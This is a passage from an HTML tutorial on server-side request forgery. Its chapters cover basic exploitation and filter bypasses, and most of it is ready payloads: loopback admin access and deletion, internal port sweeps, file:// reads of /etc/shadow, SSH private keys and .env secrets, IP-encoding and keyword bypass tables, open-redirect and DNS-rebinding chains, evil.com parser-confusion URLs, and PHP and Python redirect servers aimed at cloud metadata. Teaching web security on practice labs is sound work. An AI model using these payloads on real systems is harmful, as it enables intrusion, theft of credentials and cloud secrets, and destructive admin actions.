<section id="ch4">
  <div class="chapter-header" data-ch="04">
    <div class="ch-label">Chapter 04</div>
    <h2>Basic Exploitation Techniques</h2>
    <p>The core attack patterns that work before any defenses are in place.</p>
  </div>

  <h3>4.1 Loopback / Localhost Attack</h3>
  <p>The server's own loopback interface typically grants access to internal admin panels, debug consoles, and management APIs not exposed externally. Many internal services explicitly trust <code>127.0.0.1</code> requests with no authentication.</p>

  <span class="pre-label">Burp Suite — intercepted stock check request</span>
  <pre>POST /product/stock HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

<span class="bad">stockApi=http%3A%2F%2F192.168.0.1%3A8080%2F...</span>
<span class="c"># URL-decode first in Burp Decoder (Ctrl+Shift+U), then modify:</span>

<span class="ok">stockApi=http://localhost/admin</span>
<span class="ok">stockApi=http://127.0.0.1/admin</span>
<span class="ok">stockApi=http://127.0.0.1:8080/admin</span></pre>

  <h3>4.2 Internal Network Scanning</h3>
  <p>Use Burp Intruder to sweep internal subnets and discover services. Differentiate live hosts by response code, response size, or response time.</p>

  <span class="pre-label">Burp Intruder — internal subnet scan</span>
  <pre>POST /product/stock HTTP/1.1
Host: target.com

stockApi=http://192.168.0.<span class="bad">§1§</span>:8080/admin

<span class="c"># Payload: Numbers → From: 1, To: 255, Step: 1
# Sort results by Status Code — 200 = admin panel found
# Sort by Response Length — different length = live host</span></pre>

  <div class="info-box tip">
    <div class="box-title">💡 Port Scanning via SSRF</div>
    <p>Response time is your signal for closed ports — a connection refused response is instant (TCP RST), while a filtered port times out. Sweep common internal ports: 22, 80, 443, 3306, 5432, 6379, 8080, 8443, 8500, 9090, 9200, 10250.</p>
  </div>

  <pre><span class="c"># Common internal services to target via port scan</span>
http://127.0.0.1:6379/   <span class="c"># Redis</span>
http://127.0.0.1:5432/   <span class="c"># PostgreSQL</span>
http://127.0.0.1:3306/   <span class="c"># MySQL</span>
http://127.0.0.1:27017/  <span class="c"># MongoDB</span>
http://127.0.0.1:11211/  <span class="c"># Memcached</span>
http://127.0.0.1:8500/   <span class="c"># Consul</span>
http://127.0.0.1:9200/   <span class="c"># Elasticsearch</span>
http://127.0.0.1:8443/   <span class="c"># Kubernetes API</span>
http://127.0.0.1:10255/  <span class="c"># Kubernetes kubelet (read-only)</span>
http://127.0.0.1:10250/  <span class="c"># Kubernetes kubelet (API)</span>
http://127.0.0.1:2375/   <span class="c"># Docker daemon (HTTP)</span>
http://127.0.0.1:4040/   <span class="c"># ngrok tunnel inspector</span>
http://127.0.0.1:8161/   <span class="c"># ActiveMQ</span>
http://127.0.0.1:9000/   <span class="c"># FastCGI / Portainer</span>
http://127.0.0.1:8080/   <span class="c"># Spring Boot / Tomcat manager</span>
http://127.0.0.1:8080/actuator/  <span class="c"># Spring Boot Actuator</span></pre>

  <h3>4.3 Reading Internal Files via SSRF</h3>
  <p>When the application uses a library that supports multiple URL schemes, <code>file://</code> lets you read local files directly:</p>

  <pre>stockApi=file:///etc/passwd
stockApi=file:///etc/shadow
stockApi=file:///proc/self/environ    <span class="c"># Environment variables (often has secrets)</span>
stockApi=file:///proc/self/cmdline    <span class="c"># Command that started the process</span>
stockApi=file:///app/config.yml       <span class="c"># Application config</span>
stockApi=file:///home/ubuntu/.ssh/id_rsa  <span class="c"># SSH private key</span>
stockApi=file:///var/www/html/.env    <span class="c"># Laravel/Django secrets</span></pre>

  <h3>4.4 Deleting Users / Admin Actions via SSRF</h3>
  <p>Once you've confirmed you can reach the internal admin panel, chain reads to actions:</p>

  <pre><span class="c"># Step 1: Read the admin panel HTML to find endpoints</span>
stockApi=http://localhost/admin

<span class="c"># Step 2: Find delete/modify endpoints in the HTML response
# Step 3: Execute the admin action through SSRF</span>
stockApi=http://localhost/admin/delete?username=carlos
stockApi=http://127.0.0.1/admin/users/carlos/delete</pre>

</section>

<!-- ══════════════════════════ CHAPTER 5 ══════════════════════════ -->
<section id="ch5">
  <div class="chapter-header" data-ch="05">
    <div class="ch-label">Chapter 05</div>
    <h2>Filter Bypass Techniques</h2>
    <p>The most important chapter for real-world bug bounty. Defenses are almost always broken.</p>
  </div>

  <h3>5.1 Why Blacklists Always Fail</h3>
  <p>A blacklist must be exhaustive — it must block every possible representation of a forbidden destination. An allow-list only needs to permit what's expected. Attackers only need to find one representation the blacklist missed. The math always favors the attacker.</p>

  <h3>5.2 IP Address Encoding Bypasses</h3>
  <p>There are dozens of ways to represent <code>127.0.0.1</code>. A filter blocking the string "127.0.0.1" misses all of these:</p>

  <table class="payload-table">
    <tr><th>Payload</th><th>Technique</th></tr>
    <tr><td>http://127.0.0.1/</td><td>Baseline (usually blocked)</td></tr>
    <tr><td>http://127.1/</td><td>Short form — omitted octets default to 0</td></tr>
    <tr><td>http://127.0.1/</td><td>Three-octet short form</td></tr>
    <tr><td>http://2130706433/</td><td>32-bit decimal integer</td></tr>
    <tr><td>http://0x7f000001/</td><td>32-bit hexadecimal</td></tr>
    <tr><td>http://0177.0.0.1/</td><td>First octet in octal</td></tr>
    <tr><td>http://017700000001/</td><td>32-bit octal</td></tr>
    <tr><td>http://[::ffff:127.0.0.1]/</td><td>IPv4-mapped IPv6</td></tr>
    <tr><td>http://[::ffff:7f00:1]/</td><td>IPv4-mapped IPv6 (hex)</td></tr>
    <tr><td>http://[::1]/</td><td>IPv6 loopback</td></tr>
    <tr><td>http://0/</td><td>All zeros → 0.0.0.0 → loopback</td></tr>
    <tr><td>http://0.0.0.0/</td><td>All-zeros address — resolves as loopback in many libs</td></tr>
    <tr><td>http://localhost/</td><td>Domain that resolves to 127.0.0.1</td></tr>
    <tr><td>http://localtest.me/</td><td>Public domain always resolving to 127.0.0.1</td></tr>
    <tr><td>http://spoofed.burpcollaborator.net/</td><td>Collaborator domain resolving to 127.0.0.1</td></tr>
    <tr><td>http://127.0.0.1.nip.io/</td><td>Wildcard DNS → resolves to embedded IP</td></tr>
    <tr><td>http://[fe80::1%eth0]/</td><td>IPv6 link-local with zone ID</td></tr>
    <tr><td>http://ip6-localhost/</td><td>/etc/hosts entry → ::1</td></tr>
  </table>

  <h3>5.3 Keyword Bypasses (for "admin", "localhost", etc.)</h3>

  <table class="payload-table">
    <tr><th>Technique</th><th>Example</th><th>Notes</th></tr>
    <tr><td>Double URL-encode</td><td>http://127.1/%61dmin</td><td>%61 = 'a' after decode; filter decodes once and sees %61</td></tr>
    <tr><td>Case variation</td><td>http://127.1/ADMIN</td><td>Case-insensitive server, case-sensitive filter</td></tr>
    <tr><td>Unicode normalization</td><td>/ɑdmin</td><td>Some frameworks normalize Unicode → 'admin'</td></tr>
    <tr><td>Path traversal</td><td>/some/../admin</td><td>Appended and normalized</td></tr>
    <tr><td>Null byte</td><td>/admin%00/</td><td>Some string checks stop at null but path continues</td></tr>
    <tr><td>Slash variations</td><td>/%2fadmin</td><td>URL-encoded slash</td></tr>
  </table>

  <h3>5.4 Open Redirect Chaining</h3>
  <p>This is one of the most powerful bypasses against both blacklists AND whitelist-based defenses. If the application validates the URL is on an allowed domain, but the allowed domain has an open redirect, you chain them:</p>

  <pre><span class="c"># Whitelist only allows: stock.weliketoshop.net
# An open redirect exists at: /product/nextProduct?path=

# Step 1: Identify the open redirect</span>
GET /product/nextProduct?currentProductId=1&amp;<span class="bad">path=http://evil.com</span>

<span class="c"># Step 2: Chain it — SSRF validation sees allowed domain, follows redirect to internal</span>
<span class="ok">stockApi=http://stock.weliketoshop.net/product/nextProduct?path=http://localhost/admin</span>

<span class="c"># Flow:
# 1. Validator: "is it stock.weliketoshop.net?" → YES ✓
# 2. Server fetches stock.weliketoshop.net/nextProduct?path=...
# 3. That returns 301/302 to http://localhost/admin
# 4. Server follows redirect → reads internal admin panel</span></pre>

  <div class="info-box warn">
    <div class="box-title">⚠️ Redirect Status Codes Matter</div>
    <p>Use HTTP 307 or 308 if you need to preserve the HTTP method and body through the redirect (important for POST-based SSRF). Standard 301/302 typically converts POST to GET. Redirect to internal IP via 307 using a server you control.</p>
  </div>

  <h3>5.5 DNS Rebinding</h3>
  <p>DNS rebinding defeats "resolve-then-validate" defenses. The validator resolves your domain to a safe public IP and approves it. The HTTP client re-resolves for the actual fetch — and this time your DNS server returns an internal IP (e.g., 127.0.0.1). This works because the validation and fetch are separate operations with no DNS caching lock between them.</p>

  <pre><span class="c"># Tools for DNS rebinding attacks:</span>
<span class="c"># 1. rbndr.us — generates domains that alternate between two IPs</span>
$ nslookup make-1-2-3-4-rebind-127-0-0-1-rr.1u.ms
<span class="ok">Address: 1.2.3.4</span>   <span class="c"># First query → public IP (passes validation)</span>
<span class="ok">Address: 127.0.0.1</span> <span class="c"># Second query → internal IP (used for actual fetch)</span>

<span class="c"># 2. lock.cmpxchg8b.com/rebinder.html — point two IPs, generate domain
# 3. NCC Group Singularity — self-hosted full rebinding toolkit</span>

<span class="c"># Attack flow:
# 1. Submit: url=http://make-IP1-rebind-IP2-rr.1u.ms/
# 2. Validator resolves → IP1 (safe) → passes
# 3. HTTP client resolves → IP2 (internal) → fetches internal service</span></pre>

  <h3>5.6 Whitelist Parser Confusion</h3>
  <p>Whitelist validation checks if the URL starts with or contains an allowed domain. Parser confusion tricks the validator into reading a different host than the HTTP client actually dials:</p>

  <pre><span class="c"># Whitelist requires: stock.weliketoshop.net
# Double-encode the @ and # to confuse parsers:</span>

http://expected-host<span class="bad">%2523</span>@evil-host/
<span class="c"># %25 decodes to %, then %23 decodes to #
# Validator reads: expected-host#@evil-host → host = expected-host
# Client sends request to: evil-host</span>

http://localhost<span class="bad">%23</span>@stock.weliketoshop.net/admin
<span class="c"># Fragment trick: validator sees stock.weliketoshop.net after #
# but HTTP client never sends fragment in request</span>

https://stock.weliketoshop.net#<span class="bad">@evil.com/</span>   <span class="c"># Reversed #@ trick</span>
https://evil.com<span class="bad">.stock.weliketoshop.net/</span>      <span class="c"># DNS hierarchy abuse</span></pre>

  <h3>5.7 Redirect-Based Bypasses (Server You Control)</h3>
  <p>Host a simple redirect server. Submit its URL as the SSRF payload. The app validates the safe URL, then your server redirects to the internal target:</p>

  <span class="pre-label">PHP redirect server (hosted on attacker VPS)</span>
  <pre><span class="c">&lt;?php
// Bypass redirect filter via HTTP 303 See Other
// 303 behaves differently from 301/302 in some libraries</span>
header('Location: http://169.254.169.254/latest/meta-data/', TRUE, <span class="bad">303</span>);
?&gt;</pre>

  <span class="pre-label">Python one-liner redirect server</span>
  <pre><span class="c"># Serves a 302 redirect to the internal target</span>
python3 -c "
import http.server, urllib.parse
class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(302)
        self.send_header('Location','http://169.254.169.254/latest/meta-data/')
        self.end_headers()
http.server.HTTPServer(('',8000),H).serve_forever()
"</pre>

</section>

